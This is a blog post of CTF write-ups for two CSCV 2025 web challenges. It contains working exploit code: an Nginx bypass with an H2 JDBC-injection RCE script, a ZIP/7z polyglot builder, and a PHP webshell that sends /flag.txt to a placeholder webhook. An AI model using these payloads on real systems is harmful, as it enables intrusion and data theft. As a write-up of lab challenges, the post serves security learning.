---
title: "CSCV 2025: Web Challenge Writeups"
date: 2025-10-22
excerpt: "You can also read the write-ups for the remaining challenges of the competition on my club's blog at: https://bksec.vn/blog/writeup-cscv-2025"
tags:
  - CSCV2025
  - nginx
  - springboot
  - H2 JDBC Injection
  - ZIP Concatenation
  - SSRF
---
## **PortfolioS**

**[Nginx Bypass & H2 JDBC Injection]**

![alt text](/images/posts/cscv2025/portfolios/image.png)

This challenge provides a Java Spring Boot web application behind an Nginx reverse proxy that allows users to register, login, create and store portfolios. The application is placed behind an Nginx reverse proxy, the goal is RCE to read the content of the flag file located in the server's root directory.

![alt text](/images/posts/cscv2025/portfolios/image-1.png)

![alt text](/images/posts/cscv2025/portfolios/image-2.png)

![alt text](/images/posts/cscv2025/portfolios/image-3.png)

![alt text](/images/posts/cscv2025/portfolios/image-4.png)

![alt text](/images/posts/cscv2025/portfolios/image-5.png)

### 1: Recon

The application has main functionalities defined in Controllers:

**1.  Authentication functionality:** Users can register and login, upon successful login they are granted a JSESSIONID for that valid session. The `SecurityConfig.java` file shows that endpoints `/login`, `/register` are public, while all other endpoints require authentication.

![alt text](/images/posts/cscv2025/portfolios/image-7.png)

**2.  Portfolio functionality (`DashboardController.java`):** After logging in, users can save portfolios as text and download them as Markdown files. This functionality has Path Traversal protection

**3.  Internal functionality (File `InternalController.java`):**

This is a hidden functionality that allows testing connection to an H2 database using username/password. Reading the `InternalController.java` file reveals 2 unsafe points

```java
String fullUrl = baseUrl + "USER=" + username + ";PASSWORD=" + password + ";";
Connection conn = DriverManager.getConnection(fullUrl);
```
This code directly concatenates username and password strings (controlled by user) into a string with security-sensitive functionality (database connection string). This could be a vulnerability related to H2 JDBC Injection -> trying to access endpoint `/internal/testConnection` is blocked by Nginx and the web returns 403 error

![alt text](/images/posts/cscv2025/portfolios/image-6.png)

Additionally, there is error handling code:

```java!
catch (Exception e) {
    String var10002 = e.getMessage();
    model.addAttribute("error", "Connection failed: " + var10002 + " | URL: " + fullUrl);
}
```
When an error occurs, instead of displaying a generic message, the application takes the entire original error message from the database `(e.getMessage())` and displays it directly to the user -> can exploit this point to leak database information


**4. File `nginx.conf`**

To access endpoint `/internal/testConnection`, we need to bypass the 403 error. Continue reading file `nginx.conf`

```
events {}

http {
    server {
        listen 80;

        location = /internal/testConnection {
            return 403;
        }

        location / {
            proxy_pass http://app:8989;

            proxy_set_header Host $host:8989;
            proxy_set_header X-Real-IP $remote_addr;
        }
    }
}
```

Nginx blocks direct access to ``/internal/testConnection (HTTP 403)`` and forwards other valid requests to backend http://app:8989. The problem is the code uses exact match to filter endpoint ``/internal/testConnection``, so if we add characters to the URL without changing its meaning, we can bypass nginx.

**5. File `docker-compose.yml`** 

```
version: '3.8'

services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    container_name: portfolio
    networks:
      - no-internet
    restart: always
  nginx:
    image: nginx:1.20.2
    container_name: nginx-proxy
    ports:
      - "8989:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf
    depends_on:
      - app
    networks:
      - no-internet
      - internet
    restart: always

networks:
  internet: {}
  no-internet:
    internal: true
```

This file defines two separate services: app (Spring Boot application) and nginx, placing both in the same internal network ``(no-internet)``. In this network, Docker allows containers to find each other by service name. Therefore, the nginx container can send data to the app container simply by calling the address `http://app`. 

So when Nginx receives a valid request (i.e., not blocked by 403), the directive ``proxy_pass http://app:8989;`` will be executed and the request is forwarded to ``http://app:8989`` - received by the Tomcat web server embedded in Spring Boot. Tomcat will normalize the URL path before handing it to Spring Boot. This process includes removing invalid characters at the end of the path -> combined with our goal to add special characters to endpoint ``/internal/testConnection`` to bypass nginx, Tomcat will help remove that extra character -> request sent to SpringBoot with standard endpoint ``/internal/testConnection``


### 2: Vulnerability

Based on the information obtained, we can exploit 3 main vulnerabilities.

#### Vul 1: Nginx Reverse Proxy Bypass

This vulnerability stems from inconsistency in how Nginx and Spring Boot handle URLs, allowing bypass of access control at the proxy layer.

Nginx is configured with a very strict rule to block direct access to internal endpoint.

File nginx.conf:

Nginx is configured to block direct access to internal endpoint.

```bash
location = /internal/testConnection {
    return 403;
}
```

The `=` sign in Nginx requires exact character-by-character comparison. If the URL in the request differs by even one character from `/internal/testConnection`, it won't be blocked by nginx, from this point we can find a way to bypass nginx; but if so, when the request continues to be sent by nginx to the backend for processing, the URL may be misidentified due to strange characters. However, as analyzed above, the Tomcat web server embedded in Spring Boot has a URL normalization mechanism, it will automatically remove invalid whitespace characters at the end of the path -> this helps the URL that was modified to bypass nginx to be corrected back before Spring Boot receives it

#### Vul 2: H2 JDBC Connection String Injection (RCE)

This is the vulnerability that allows us to execute remote code.

File (`InternalController.java`):

```java
String fullUrl = baseUrl + "USER=" + username + ";PASSWORD=" + password + ";";
Connection conn = DriverManager.getConnection(fullUrl);
```
The application directly concatenates `username` and `password` into the JDBC connection string (`fullUrl`). We can inject H2 control parameters into these fields. The most dangerous parameter is `INIT`, which allows executing an SQL script as soon as the connection is created. By using `CREATE ALIAS`, we can create an arbitrary Java function and execute system commands, leading to RCE.

#### Vul 3: Error-Based Exfiltration

The application handles errors insecurely, inadvertently exposing sensitive information.

File `InternalController.java`:

```java
catch (Exception e) {
    String var10002 = e.getMessage();
    model.addAttribute("error", "Connection failed: " + var10002 + " | URL: " + fullUrl);
    return "internal";
}
```
When there is an error working with the database, instead of returning a generic error message, the application takes the entire original error message from the database (`e.getMessage()`) and displays it to the user. We can exploit this behavior to read file contents by instructing the database to execute a file containing the flag (which is not a valid script), the database will report an error with the contents of the flag file.

### 3: Idea

Combining the above vulnerabilities, we have the exploitation approach:

**1.  Bypass Nginx:** 
By sending a POST request to a path containing a whitespace character at the end, refer to [ref](https://blog.bugport.net/exploiting-http-parsers-inconsistencies#heading-how-to-prevent) ->  for example `POST /internal/testConnection\x09` (where \x09 is tab character), the request will not match Nginx's exact matching rule and will be forwarded to the backend. At the backend, Tomcat will automatically normalize the URL to `/internal/testConnection` before Spring Boot processes it, allowing us to successfully access the vulnerable endpoint.

**2.  JDBC URL Injection:** Exploit JDBC Injection to send SQL commands. The first step is to create a temporary table and use parameter `DB_CLOSE_DELAY=-1` to keep the database persistent between requests.

**3.  Build Payload RCE:** 

Send a series of requests to build the RCE payload in the newly created temporary table, each request will append one character to the payload being stored in the temporary table through command ``UPDATE ... SET d = d || CHAR(...)``. This technique avoids request length limitations and detection by defense systems.

Trong file `InternalController`, có đoạn code kiểm tra độ dài của input:

```Java

if ((username + password).length() >= 95) { ... }

```
    
The final payload built will use `CREATE ALIAS` to define a Java function capable of executing the system command `cat /* > /tmp/shiba` — this command reads the content of the flag file with random name in the root directory and writes the result to a temporary file.

**4.  Get flag:** 

After the payload in the temporary table is complete, we execute it with two commands: 

1. First use `FILE_WRITE` to write the payload from the database to a script file on the server (e.g. ``/tmp/shaaa``), then use ``RUNSCRIPT FROM '/tmp/shaaa'`` to execute that script. At this point the command `cat /* > /tmp/shiba` is executed -> file /tmp/shiba now contains the flag content. 
2. Finally, exploit the Error-Based Exfiltration vulnerability by sending a request ``RUNSCRIPT FROM '/tmp/shiba'``. This operation will cause an SQL syntax error because the content in the file is not SQL commands but the flag -> the application will return an error message containing the flag content itself.

### 4: PoC

```python
from pwn import *
import random

context.log_level = 'info'

# Configuration
HOST = "localhost"
PORT = 8989
SESSION_ID = "B5892AF2A215B6DCF85102E7B4C4FEE1"

ran_table = "t" + str(random.randint(1000, 9999))

def send_post(path, data):
    """Send POST request using pwntools"""
    # Connect to the server
    conn = remote(HOST, PORT)
    
    # Build POST request body
    body_params = '&'.join([f"{k}={v}" for k, v in data.items()])
    
    # Build HTTP POST request
    request = f"POST {path} HTTP/1.1\r\n"
    request += f"Host: {HOST}:{PORT}\r\n"
    request += "Content-Type: application/x-www-form-urlencoded\r\n"
    request += f"Cookie: JSESSIONID={SESSION_ID}\r\n"
    request += f"Content-Length: {len(body_params)}\r\n"
    request += "Connection: close\r\n"
    request += "\r\n"
    request += body_params
    
    # Send request
    conn.send(request.encode())
    
    # Receive response
    response = conn.recvall(timeout=2).decode('utf-8', errors='ignore')
    conn.close()
    
    return response

# Create table
log.info(f"Creating table {ran_table}")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=CREATE TABLE {ran_table}(d VARCHAR)",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success(f"Created table {ran_table}")

# Insert first part
log.info("Inserting first part")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=INSERT INTO {ran_table} VALUES('CREATE ')",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Inserted first part")
        
def add(num):
    """Append character to the payload"""
    data = {
        "username": "a",
        "password": f"a;DB_CLOSE_DELAY=-1;INIT=UPDATE {ran_table} SET d = d || CHAR({num})",
    }
    r = send_post("/internal/testConnection\x09", data)
    if "faild" not in r:
        log.info(f"Appended CHAR({num})")
        
payload = """ALIAS SHELL AS $$void shell()throws Exception{ Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","cat /* > /tmp/shaaa"});}$$;CALL SHELL();"""

log.info("Building payload character by character")
for c in payload:
    add(ord(c))
    
# Write to /tmp/shaaa
log.info("Writing to /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=CALL FILE_WRITE((SELECT * FROM {ran_table} LIMIT 1), '/tmp/shaaa')",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Wrote to /tmp/shaaa")
    
# Execute
log.info("Executing /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/shaaa'",
}
r = send_post("/internal/testConnection\x09", data)
if "faild" not in r:
    log.success("Executed /tmp/shaaa")
    
# Check result
log.info("Checking result from /tmp/shaaa")
data = {
    "username": "a",
    "password": f"a;DB_CLOSE_DELAY=-1;INIT=RUNSCRIPT FROM '/tmp/shaaa'",
}
r = send_post("/internal/testConnection\x09", data)
print("\n" + "="*50)
print("RESPONSE:")
print("="*50)
print(r)
```
---
## **ZC-1**

**[ZIP Concatenation & SSRF]**

This challenge provides two web applications: a Python gateway (Django) that allows ZIP file upload and a PHP storage backend to process files. The system has a whitelist file extension check mechanism before storage. The goal is RCE to read the flag from `/flag.txt`.

### 1: Recon

#### Architecture Overview

The challenge includes 2 applications deployed using Docker Compose:

- **app1 (Python/Django)**: Gateway application running on port 8000, handles authentication and file upload
- **app2 (PHP)**: Storage backend not exposed externally, can only be accessed from app1

#### App1 - Gateway (Django)

Main endpoints:

1. **Authentication:**
   - `POST /gateway/user/` - Register new user
   - `POST /auth/token/` - Get JWT access token

2. **File Upload (`gateway/views.py`):**
   ```python
   @action(detail=False, methods=['post'], url_path='transport')
   def transport(self, request: Request, *args, **kwargs):
       file = request.FILES["file"].file
       if not check_file(file):
           return Response(data="Invalid file")
       file.seek(0)
       msg = transport_file(str(request.user.id), file)
       return Response(data=msg)
   ```

3. **Health Check:**
   ```python
   @action(detail=False, methods=['get'], url_path='health')
   def health(self, request: Request, *args, **kwargs):
       module = request.query_params.get("module", "/health.php")
       if health_check(module):
           return Response(data="OK")
       return Response(data="ERR")
   ```

File validation logic (`gateway/utils.py`):

```python
def check_file(file):
    try:
        with zipfile.ZipFile(file,"r") as zf:
            namelist = zf.namelist()
            if len([f for f in namelist if not f.endswith(allow_storage_file)]) > 0:
                return False
    except:
        return False
    return True
```

Whitelist is defined in `settings.py`:
```python
ALLOW_STORAGE_FILE = ('.txt',)  # Only allows .txt files
```

#### App2 - Storage (PHP)

File `storage.php` handles file extraction:

```php
<?php
require "vendor/autoload.php";
use Archive7z\Archive7z;

if(isset($_POST['id']) && isset($_FILES['file'])){
    $storage_dir = __DIR__ . "/storage/" . $_POST['id'];
    
    if(!is_dir($storage_dir)){
        mkdir($storage_dir);
    }
    
    $obj = new Archive7z($_FILES["file"]["tmp_name"]);
    $obj->setOutputDirectory($storage_dir);
    $obj->extract();
}
?>
```

**Important point:** App2 uses `Archive7z` (7z) library to extract, different from Python zipfile!

---

### 2: Vulnerability

#### Vul 1: ZIP Parser Discrepancy - ZIP Concatenation

This is the main vulnerability that allows bypassing file validation.

**Differences in ZIP parsing:**

1. **Python `zipfile` module:**
   - Reads file from **end to beginning**
   - Finds "End of Central Directory" (EOCD) from end of file
   - Parses Central Directory based on offset in EOCD
   - Finally reaches Local File Headers

2. **7z archive tool:**
   - Reads file from **beginning to end**
   - Finds 7z signature at beginning of file (`37 7A BC AF 27 1C`)
   - Parses according to 7z structure if signature is found

**ZIP Concatenation technique:**

When concatenating `7z_archive + zip_archive`:
- Python zipfile only sees ZIP part at end (contains valid `.txt` file)
- 7z sees 7z part at beginning (contains dangerous `shell.php`)

**Issue with offset:**

When concatenating, the ZIP part shifts down, offsets in ZIP structure are no longer accurate. Need to fix 2 important offsets:

1. **Offset to Central Directory** (in EOCD, at position +16)
2. **Offset to Local File Header** (in Central Directory, at position +42)

Both offsets need to be increased by exactly the size of the 7z part added at the front.

#### Vul 2: SSRF via Health Check Endpoint

File `gateway/utils.py`:

```python
def health_check(module):
    try:
        res = requests.get(storage_url + module, timeout=2)
        if res.status_code == 200:
            return True
        return False
    except:
        return False
```

Parameter `module` is concatenated directly into URL **without validation**!

Path traversal payload:
```
/storage.php/../storage/<user_id>/shell.php
```

This endpoint allows triggering execution of uploaded PHP file.

#### Vul 3: JWT Token Information Disclosure

JWT token contains `user_id` in payload (not encrypted, only base64):

```json
{
  "token_type": "access",
  "exp": 1765231331,
  "iat": 1765231031,
  "jti": "95769...",
  "user_id": "6d33c06b-8ce4-4ae6-b14b-620e035e1eed"
}
```

This User ID is necessary to know the file storage directory after extraction.

---

### 3: Exploit

#### Step 1: Create safe ZIP file (whitelist compliant)

```powershell
# Create dummy file
echo 'dummy' | Out-File -Encoding ASCII file.txt

# Create ZIP file
Compress-Archive -Path file.txt -DestinationPath file.zip -Force
```

Verify:
```powershell
python -c "import zipfile; print(zipfile.ZipFile('file.zip').namelist())"
# Output: ['file.txt']
```

#### Step 2: Create 7z archive containing webshell

```powershell
# Create webshell
'<?php system("curl YOUR_WEBHOOK_URL -F \"file=@/flag.txt\""); ?>' | Out-File -Encoding ASCII -NoNewline shell.php

# Create TAR archive containing shell.php
python -c "import tarfile; t=tarfile.open('shell.tar','w'); t.add('shell.php'); t.close()"
```

**Note:** Need to use `-NoNewline` and `ASCII` encoding to avoid BOM and newline characters that prevent PHP from parsing

#### Step 3: Create ZIP Concatenation payload

Create polyglot file using the following script:

```python
#!/usr/bin/env python3
import struct
from pathlib import Path

def create_polyglot(tar_file, zip_file, output_file):
    tar_data = Path(tar_file).read_bytes()
    zip_data = bytearray(Path(zip_file).read_bytes())
    
    shift = len(tar_data)
    print(f'[+] TAR size: {shift} bytes (0x{shift:x})')

    eocd_pos = zip_data.rfind(b'PK\x05\x06')
    if eocd_pos == -1:
        raise SystemExit('[!] Error: EOCD signature not found!')
    
    cd_size = struct.unpack_from('<I', zip_data, eocd_pos + 12)[0]
    cd_offset = struct.unpack_from('<I', zip_data, eocd_pos + 16)[0]
    
    cur = cd_offset
    end = cd_offset + cd_size
    
    while cur < end:
        if zip_data[cur:cur+4] != b'PK\x01\x02':
            raise SystemExit(f'[!] Bad Central Directory entry')
        
        # Fix relative offset of local header (at CD+42)
        rel_off = struct.unpack_from('<I', zip_data, cur + 42)[0]
        new_rel_off = rel_off + shift
        struct.pack_into('<I', zip_data, cur + 42, new_rel_off)
        
        # Move to next entry
        name_len, extra_len, comment_len = struct.unpack_from('<HHH', zip_data, cur + 28)
        cur += 46 + name_len + extra_len + comment_len
    
    # Fix offset of Central Directory in EOCD
    new_cd_offset = cd_offset + shift
    struct.pack_into('<I', zip_data, eocd_pos + 16, new_cd_offset)
    
    # Create polyglot: TAR + ZIP
    Path(output_file).write_bytes(tar_data + zip_data)
    print(f'[+] Polyglot created: {output_file}')

if __name__ == '__main__':
    create_polyglot('shell.tar', 'file.zip', 'polyglot.zip')
```

#### Step 4: Verify payload

```powershell
# Python zipfile only sees file.txt
python -c "import zipfile; print(zipfile.ZipFile('polyglot.zip').namelist())"
# Output: ['file.txt']

# 7z sees shell.php
7z l polyglot.zip
# Output: shell.php
```

#### Step 5: Register user and get token

```powershell
# Register user
Invoke-RestMethod -Method Post -Uri "http://localhost:8000/gateway/user/" `
  -ContentType "application/json" `
  -Body '{"username":"attacker","password":"password123"}'

# Get JWT token
$response = Invoke-RestMethod -Method Post -Uri "http://localhost:8000/auth/token/" `
  -ContentType "application/json" `
  -Body '{"username":"attacker","password":"password123"}'
$token = $response.access

echo "Token: $token"
```

#### Step 6: Decode JWT to get user_id

```powershell
# Decode JWT payload
python -c "import base64, json; parts='$token'.split('.'); payload=parts[1]+'='*(4-len(parts[1])%4); data=json.loads(base64.b64decode(payload)); print('User ID:', data['user_id'])"

# Save user_id
$userId = "YOUR_USER_ID_HERE"
```

#### Step 7: Upload polyglot payload

```powershell
# Upload file
curl.exe -F "file=@polyglot.zip" http://localhost:8000/gateway/transport/ `
  -H "Authorization: Bearer $token"

# Response: "OK"
```

At this point:
- App1 validates using zipfile → Sees `file.txt` → Pass
- App2 extracts using 7z → Extracts `shell.php`

#### Step 8: Trigger SSRF to execute webshell

```powershell
# SSRF payload with path traversal
curl.exe "http://localhost:8000/gateway/health/?module=/storage.php/../storage/$userId/shell.php" `
  -H "Authorization: Bearer $token"

```

Request flow:
```
Client → app1:/gateway/health?module=/storage.php/../storage/<user_id>/shell.php
      → app2:http://app2/storage.php/../storage/<user_id>/shell.php
      → Execute shell.php
      → curl sends flag to webhook
```

#### Step 9: Receive flag from webhook

Check webhook.site, you will see POST request with file data containing the flag:

![alt text](/images/posts/cscv2025/zc-1/image.png)

![alt text](/images/posts/cscv2025/zc-1/image-1.png)